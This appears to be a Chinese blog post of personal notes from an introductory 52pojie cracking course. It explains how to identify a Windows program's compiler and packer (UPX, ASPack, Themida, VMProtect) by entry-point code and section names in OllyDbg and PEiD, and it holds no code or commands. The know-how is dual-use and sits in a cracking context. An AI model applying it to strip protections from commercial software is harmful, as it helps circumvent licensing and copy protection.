&lt;p&gt;目的：认识、辨别普通的壳，不同的壳有不同的目的。&lt;/p&gt;
&lt;p&gt;网站内资源准备好：吾爱破解虚拟机环境、脱壳例子下载、视频课程。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183758481-919337006.png&#34;
	width=&#34;226&#34;
	height=&#34;19&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183758481-919337006_hu3186473441749622255.png 480w, https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183758481-919337006_hu18264483239037948331.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1189&#34;
		data-flex-basis=&#34;2854px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;l是日志，e是模块信息，包含程序加载的完整模块和路径，m是内存和地址，t是线程，w是窗口，h是句柄信息，c是反汇编窗口，p记录管理员修改信息，k是调用的堆栈，b断点。&lt;/p&gt;
&lt;p&gt;把exe文件拖入exeinfope中查看是哪种语言编译的，是否加壳。&lt;/p&gt;
&lt;p&gt;全文仅供个人记录使用，如有疏漏敬请包容。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;0x01 程序是什么语言编译的&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;从目前国内接触到程序看，比较流行的编译器有：VC系列、易语言、.NET、Delphi，一些曾经用的很多但渐渐少了有：VB、ASM、BC++，还有一些用的比较少的有：AutoIt、PB、QT等，下面提供一些由论坛同学编译出来的试炼品，结合实例来看看&amp;quot;入口点代码&amp;quot;、&amp;ldquo;程序区段&amp;quot;和&amp;quot;加载模块&amp;quot;等特征。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;VC6编译无壳程序&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;查看入口点代码如下：&lt;br&gt;
&lt;img src=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183758971-458056123.png&#34;
	width=&#34;785&#34;
	height=&#34;638&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183758971-458056123_hu8301786444828052562.png 480w, https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183758971-458056123_hu4773813524555129022.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;123&#34;
		data-flex-basis=&#34;295px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.52pojie.cn/thread-12865-1-1.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PEID&lt;/a&gt;查看区段如下：&lt;br&gt;
&lt;img src=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183759396-603458269.png&#34;
	width=&#34;785&#34;
	height=&#34;235&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183759396-603458269_hu715028020148003340.png 480w, https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183759396-603458269_hu10913949592948663939.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;334&#34;
		data-flex-basis=&#34;801px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;**
&lt;em&gt;VC6特点：入口点代码是固定的代码，入口调用的API也是相同的，其中有的push地址不同程序可能不同；区段有四个也是固定的.text、.rdata、.data和.rsrc。&lt;/em&gt;**&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;VS2008和VS2013编译无壳程序 __&lt;/strong&gt;&lt;br&gt;
OllyDbg查看入口点代码如下：&lt;br&gt;
&lt;img src=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183759667-1066491298.png&#34;
	width=&#34;785&#34;
	height=&#34;119&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183759667-1066491298_hu2784564824792147577.png 480w, https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183759667-1066491298_hu13527936889065830276.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;659&#34;
		data-flex-basis=&#34;1583px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183759961-1780110399.png&#34;
	width=&#34;785&#34;
	height=&#34;597&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183759961-1780110399_hu13534569172393013914.png 480w, https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183759961-1780110399_hu7867819660431376800.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;131&#34;
		data-flex-basis=&#34;315px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;PEID查看区段如下：&lt;br&gt;
&lt;img src=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183800374-334226634.png&#34;
	width=&#34;785&#34;
	height=&#34;227&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183800374-334226634_hu11675572907233723374.png 480w, https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183800374-334226634_hu1844251366093143655.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;345&#34;
		data-flex-basis=&#34;829px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;** &lt;em&gt;VS特点：入口点只有两行代码，一个CALL后直接JMP，第一个CALL进去后调用的API也是相同的；区段相对于VC6多了一个.reloc。&lt;/em&gt;**&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;易语言编译无壳程序（独立编译和非独立编译）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;（由于易语言独立编译是调用VC的链接程序编译的，所以从区段和入口代码特征和VC相同，下图为非独立编译带运行库）&lt;br&gt;
OllyDbg查看入口点代码如下：&lt;br&gt;
&lt;img src=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183800682-574510489.png&#34;
	width=&#34;778&#34;
	height=&#34;492&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183800682-574510489_hu8436440531185837359.png 480w, https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183800682-574510489_hu1963283174819790482.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;158&#34;
		data-flex-basis=&#34;379px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;查看模块：&lt;br&gt;
&lt;img src=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183801053-960458476.png&#34;
	width=&#34;772&#34;
	height=&#34;123&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183801053-960458476_hu6716216281745660787.png 480w, https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183801053-960458476_hu5234698688000875852.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;627&#34;
		data-flex-basis=&#34;1506px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;查看核心代码：&lt;br&gt;
&lt;img src=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183801368-1699294464.png&#34;
	width=&#34;772&#34;
	height=&#34;534&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183801368-1699294464_hu8228767391359698535.png 480w, https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183801368-1699294464_hu5434945765062076604.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;144&#34;
		data-flex-basis=&#34;346px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;**
&lt;em&gt;易语言特点：可以从程序里找一些call的调用最终都会走到上面核心代码图位置（文字不太好表达），这个方法可以区分和VC的区别，非独立编译比较容易识别，入口特征和模块特征都有krnln.fnr。&lt;/em&gt;**&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Delhpi编译无壳程序&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183801775-2021952330.png&#34;
	width=&#34;694&#34;
	height=&#34;620&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183801775-2021952330_hu16286599492060064441.png 480w, https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183801775-2021952330_hu3973346037744359499.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;111&#34;
		data-flex-basis=&#34;268px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183802124-1320926933.png&#34;
	width=&#34;934&#34;
	height=&#34;247&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183802124-1320926933_hu5533164523485759955.png 480w, https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183802124-1320926933_hu16047704013821728837.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;378&#34;
		data-flex-basis=&#34;907px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;.net特征&lt;/strong&gt; ：** &lt;em&gt;看模块，加载了很多的.net库&lt;/em&gt;**&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183802480-349220270.png&#34;
	width=&#34;666&#34;
	height=&#34;321&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183802480-349220270_hu17854975803809146332.png 480w, https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183802480-349220270_hu1753508467826908618.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;207&#34;
		data-flex-basis=&#34;497px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;0x02 部分壳的特征&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Aspack&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;区段：&lt;img src=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183802808-2086261593.png&#34;
	width=&#34;78&#34;
	height=&#34;134&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183802808-2086261593_hu419618825008678643.png 480w, https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183802808-2086261593_hu18153560778132127514.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;58&#34;
		data-flex-basis=&#34;139px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;入口特征：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183803217-167301300.png&#34;
	width=&#34;529&#34;
	height=&#34;86&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183803217-167301300_hu6013567903825763494.png 480w, https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183803217-167301300_hu3780457620480235751.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;615&#34;
		data-flex-basis=&#34;1476px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;UPX&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;区段：被压缩过，压缩结果是UPX0和UPX1，名称可以随便改，基本就是三个&lt;img src=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183803439-1146347486.png&#34;
	width=&#34;75&#34;
	height=&#34;63&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183803439-1146347486_hu1957302895794957474.png 480w, https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183803439-1146347486_hu7138183276213686266.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;119&#34;
		data-flex-basis=&#34;285px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;入口特征：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183803650-100543327.png&#34;
	width=&#34;526&#34;
	height=&#34;116&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183803650-100543327_hu10078294490414435764.png 480w, https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183803650-100543327_hu5818269975178033814.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;453&#34;
		data-flex-basis=&#34;1088px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Themida&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;区段：后两个名称随机&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183803870-1986245239.png&#34;
	width=&#34;576&#34;
	height=&#34;89&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183803870-1986245239_hu2148027604260753704.png 480w, https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183803870-1986245239_hu6061671564878108431.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;647&#34;
		data-flex-basis=&#34;1553px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Vmprotect：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;主要看区段特征：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183804160-1002734420.png&#34;
	width=&#34;576&#34;
	height=&#34;119&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183804160-1002734420_hu524280384421887624.png 480w, https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183804160-1002734420_hu17676988547773036853.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;484&#34;
		data-flex-basis=&#34;1161px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;入口特征显得杂乱无章&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Shielden&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;区段：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183804403-1254491279.png&#34;
	width=&#34;576&#34;
	height=&#34;78&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183804403-1254491279_hu12678319110306769728.png 480w, https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183804403-1254491279_hu2180513545673398299.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;738&#34;
		data-flex-basis=&#34;1772px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;入口（经跳转和分析过的）：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183804604-2077683305.png&#34;
	width=&#34;576&#34;
	height=&#34;80&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183804604-2077683305_hu1967251222264643792.png 480w, https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/1858293-20200131183804604-2077683305_hu10604797450279580828.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;720&#34;
		data-flex-basis=&#34;1728px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;加壳技术可以方便我们对程序进行保护、压缩等措施，而脱壳技术则方便我们对程序进行更大程度上的修改。&lt;/p&gt;
&lt;h1 id=&#34;附初学者教程破解基础知识之认识壳与程序的特征本文有摘抄&#34;&gt;附：【初学者教程】破解基础知识之认识壳与程序的特征（本文有摘抄）
&lt;/h1&gt;&lt;h1 id=&#34;httpswww52pojiecnthread-234739-1-1html&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.52pojie.cn/thread-234739-1-1.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.52pojie.cn/thread-234739-1-1.html&lt;/a&gt;
&lt;/h1&gt;</description>
        </item>
        <item>
        <title>第五章 计算机组成</title>
        <link>https://dorinxl.github.io/p/%E7%AC%AC%E4%BA%94%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90/</link>
        <pubDate>Wed, 29 Jan 2020 13:38:00 +0000</pubDate>
        
